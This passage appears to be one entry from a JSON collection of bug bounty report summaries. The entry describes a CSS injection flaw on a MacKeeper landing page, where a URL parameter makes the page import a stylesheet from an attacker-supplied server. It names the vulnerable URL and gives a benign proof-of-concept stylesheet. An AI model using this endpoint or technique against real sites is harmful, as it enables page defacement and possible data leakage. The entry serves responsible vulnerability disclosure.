  "summaries": [
    {
      "id": 21706,
      "category": "team",
      "content": "### Summary\nCSS injection vulnerabilities arise when an application imports a style sheet from a user-supplied URL, or embeds user input in CSS blocks without adequate escaping. They are closely related to cross-site scripting (XSS) vulnerabilities but often trickier to exploit.\n\n### Steps to reproduce\nthe vulnerabile url is : \n`https://static.mackeeper.com/landings/libs/alert/alerts/exitpopup74/exit-popup.php?root=https://+YOUR SERVER+/&lang=en`\n```html\n<style>\n    @import url(\"https://YOUR SERVER/alert/alerts/exitpopup74/css/exit-popup.css\");\n</style>\n```\n\ncreate a css file with name exit-popup.css on this path `/alert/alerts/exitpopup74/css/`\nnow edit the css file exit-popup.css with this css code:\n```css\ndiv {\n background-image: url(\"https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif\");\n background-color: #cccccc;\n}\n```\nnow go to \n`https://static.mackeeper.com/landings/libs/alert/alerts/exitpopup74/exit-popup.php?root=https://+Your+Server+/&lang=en`",
